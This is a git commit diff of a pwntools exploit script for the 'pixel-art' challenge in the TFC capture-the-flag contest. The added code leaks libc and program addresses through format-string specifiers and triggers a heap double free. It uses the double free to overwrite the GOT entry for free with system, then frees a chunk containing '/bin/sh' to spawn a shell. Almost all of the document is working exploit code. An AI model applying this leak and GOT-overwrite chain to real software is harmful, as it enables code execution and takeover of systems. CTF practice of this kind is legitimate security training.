5af46d94ada944b243ebed44b5cf8e62eb662b49
littefoot22 <buck.20.two@gmail.com>
2021-12-02 23:39:30 -0500

    TFC CTF

--- tfc/pixel-art.py
+++ tfc/pixel-art.py
@@ -9,9 +9,9 @@ import os
 import time
 import pwn
 
-
 # Set up pwntools for the correct architecture
 exe  = pwn.context.binary = pwn.ELF('pixel-art')
+libc  = pwn.context.binary = pwn.ELF('libc.so.6')
 
 pwn.context(terminal=['tmux', 'new-window'])
 pwn.context.log_level = 'DEBUG'
@@ -43,15 +43,19 @@ def start(argv=[], *a, **kw):
     else:
         return remote(argv, *a, **kw)
 
+#gdbscript = '''
+#b main
+#b *0x5555555552ce
+#b *0x55555555536a
+#b *0x5555555557ac
+#'''.format(**locals())
+
 gdbscript = '''
 b main
-b *0x5555555552ce
-b *0x55555555536a
-b *0x5555555557ac
-b *0x55555555566d
-b *0x55555555568a
+b *0x55555555536f if $rax == 0x00005555555575d0
 '''.format(**locals())
 
+#b *0x5555555552d3 if $rax == 0x00005555555575d0
 #===========================================================
 #                    EXPLOIT GOES HERE
 #===========================================================
@@ -99,6 +103,16 @@ def addPixal(row, column, patternlen, pattern):
     io.recvuntil("pattern>")
     io.sendline(pattern)
 
+def editPixal(row, column, pattern):
+    io.recvuntil("Exit\n")
+    io.sendline("3")
+    io.recvuntil("row>")
+    io.sendline(row)
+    io.recvuntil("column>")
+    io.sendline(column)
+    io.recvuntil("pattern>")
+    io.sendline(pattern)
+
 
 def removePixal(row, column):
     io.recvuntil("Exit\n")
@@ -117,9 +131,25 @@ io.sendline("50")
 io.recvuntil(":")
 io.sendline("50")
 
+#this will print down the stack from printf
 addPixal("0", "0", "5", b"%25$p")
 addPixal("0", "1", "5", b"%17$p")
 show()
+
+io.recvuntil(b"0x")
+libc_string = io.recvuntil(b"0x")
+prog_string = io.recvuntil(b" ")
+
+size = len(libc_string)
+
+print("libc_add :: " + str(libc_string[:len(libc_string) - 2]))
+print("prog_add :: " + str(prog_string[:len(prog_string) - 1]))
+
+libc_base = int(libc_string[:len(libc_string) - 2], 16) - 0x20b3 - 0x25000
+prog_base = int(prog_string[:len(prog_string) - 1], 16) - 0x1b39
+
+print("libc_add :: " + hex(libc_base))
+print("prog_add :: " + hex(prog_base))
 
 addPixal("1", "1", "1", "A")
 addPixal("2", "1", "1", "A")
@@ -132,6 +162,7 @@ addPixal("8", "1", "1", "A")
 addPixal("9", "1", "1", "A")
 addPixal("10", "1", "1", "A")
 addPixal("11", "1", "1", "A")
+
 removePixal("1", "1")
 removePixal("2", "1")
 removePixal("3", "1")
@@ -139,19 +170,37 @@ removePixal("4", "1")
 removePixal("5", "1")
 removePixal("6", "1")
 removePixal("7", "1")
+removePixal("11", "1")
+
+#trigger double free
 removePixal("8", "1")
 removePixal("9", "1")
 removePixal("8", "1")
 
+removePixal("9", "1")
+removePixal("10", "1")
 
-addPixal("1", "1", "1", "A")
-addPixal("2", "1", "1", "A")
-addPixal("3", "1", "1", "A")
-addPixal("4", "1", "1", "A")
-addPixal("5", "1", "1", "A")
 
-#addPixal("6", "1", "1", "A")
-#addPixal("7", "1", "1", "A")
+print("exe.symbols[got.free] :: " + hex(prog_base + exe.symbols["got.free"]))
+print("exe.symbols[got.free] :: " + hex(exe.symbols["got.free"]))
 
+
+addPixal("15", "1", str(len(pwn.p64(prog_base + exe.symbols["got.free"])) + 1), pwn.p64(prog_base + exe.symbols["got.free"]) * 2)
+
+#addPixal("15", "2", str(len(pwn.p64(prog_base + exe.symbols["got.free"])) + 1), pwn.p64(prog_base + exe.symbols["got.free"]) * 2)
+addPixal("15", "2", str(len(b"/bin/sh\x00")), b"/bin/sh\x00")
+addPixal("15", "3", str(len(pwn.p64(prog_base + exe.symbols["got.free"])) + 1), pwn.p64(prog_base + exe.symbols["got.free"]) * 2)
+addPixal("15", "4", str(len(pwn.p64(prog_base + exe.symbols["got.free"])) + 1), pwn.p64(prog_base + exe.symbols["got.free"]) * 2)
+addPixal("15", "5", str(len(pwn.p64(prog_base + exe.symbols["got.free"])) + 1), pwn.p64(prog_base + exe.symbols["got.free"]) * 2)
+addPixal("15", "6", str(len(pwn.p64(prog_base + exe.symbols["got.free"])) + 1), pwn.p64(prog_base + exe.symbols["got.free"]) * 2)
+
+#skip ne malloc so the next pixal will get the got.free addr
+addPixal("15", "7", "50", pwn.p64(prog_base + exe.symbols["got.free"]) * 2)
+
+#double free will now return got.free addr and populate with system
+addPixal("15", "8", str(len(pwn.p64(libc_base + libc.symbols["system"])) + 1), pwn.p64(libc_base + libc.symbols["system"]))
+
+#now we free 15, 2 since the pixal heap addr has "/bin/sh" from the addPixal above
+removePixal("15", "2")
 
 io.interactive()
